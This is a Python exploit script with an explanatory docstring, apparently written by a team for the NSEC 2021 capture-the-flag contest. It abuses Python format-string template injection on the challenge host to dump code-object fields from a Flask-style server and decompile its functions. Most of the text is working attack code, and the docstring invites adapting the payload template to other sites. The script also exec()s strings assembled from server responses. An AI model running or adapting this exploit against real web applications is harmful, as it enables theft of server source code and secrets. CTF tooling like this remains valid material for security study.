#!/usr/bin/python3.8
'''
This tool was depelopped by the team 0K10K for the NSEC CTF in 2021

If you have SSTI on a web page in python (like flask), it's possible to 
ask the server for variable values.
    Ex: 
    a="my valiable"
    {a} --> prints in the webpage "my valiable" (no quotes)
More documentation: 
    https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti
    https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
    ... and a lot more
In some context, this can be abused to execute code. Most of the time this can be used to print the server's code
In the challenge we were doing, we couldn't call a function. So we couldn't leak the code.
So after some search, we found that python function object have a "__code__" argument that returns a CodeType object.
This object has many accessible variables: https://stackoverflow.com/questions/6612449/what-are-the-arguments-to-the-types-codetype-python-call
Through this, we were able to leak a function definition. But we still were not able to read the code in a human format (it was byte code).
That's when we found uncompyle6 which takes a CodeType objects and prints the uncompiled code.
Note: on python3.9 we need decompyle3 which is good for 3.7+

To reconstruct the function object, we simply created a useless function "a" to initiate a "co" variable with the a.__code__ object.
We can then use co.replace() to replace the definition of this function with the one leaked, and then print the code with:
uncompyle6.code_deparse(co)

This script automates the process of fetching the info and then printing the uncompiled function.
It is contextualised to NSEC 2021 CTF, but could easily be adapted.
To use it:
    python3 dump2.py index # this will leak the definition of the index function, which is the index page of the webste
    python3 dump2.py render
    python3 dump2.py restricted_loads

Here, the values are in the variable name here: 'log.__class__.__init__.__globals__['+ name + '].__code__.co_(...)'
Replace this template to your convenience to match your use case

To use it on an inner object's function:
     python3 dump2.py log.__class__.__init__.__globals__[render].__code__.co_consts[2]


Note:
The dump function does a post request and then parses the response to fetch the result.
This would need to be adapted to another context also.
'''

import requests
import uncompyle6
import urllib
import re
import html
import sys


s = requests.Session()
g = s.get('http://wizlog.ctf/')

unquote = re.compile('(?<!\\\\)\'')

def do_dump(f):
    urllib.parse.quote_plus(f)
    r = s.post('http://wizlog.ctf/render', data = {'format': f}, proxies = {'http':'http://localhost:8080'})
    #print(r.text)
    m = re.search('<pre>\n(.*?)<br />', r.text, re.DOTALL)
    if m:
        val = html.unescape(m.group(1))
        return val
    else:
        None

#funcs = ('co_argcount','co_kwonlyargcount','co_nlocals','co_stacksize','co_flags','co_code','co_consts','co_names','co_varnames','co_filename','co_firstlineno','co_lnotab','co_freevars','co_cellvars')
funcs = ('co_argcount','co_kwonlyargcount','co_nlocals','co_stacksize','co_flags','co_code','co_consts','co_names','co_varnames','co_firstlineno','co_lnotab','co_freevars','co_cellvars')


name = sys.argv[1]
prefix = 'log.__class__.__init__.__globals__['+ name + ']'
if len(sys.argv)>2: prefix = sys.argv[2]

def a(s):
    '''my desc'''
    return "A"

co = a.__code__

func_text = 'co = co.replace(' 
func_text += 'co_name = \'' + name + '\','
for f in funcs:
    v = do_dump('{'+prefix+'.__code__.'+f + '}')
    func_text += '\n\t' + f + ' = ' + v + ","
f = 'co_filename'
v = do_dump('{'+prefix+'.__code__.'+ f + '}')
func_text += f + ' = \'' + v + "'"
func_text += ")"

print(func_text)
exec(func_text)

print('\n\n')
uncompyle6.code_deparse(co)

print()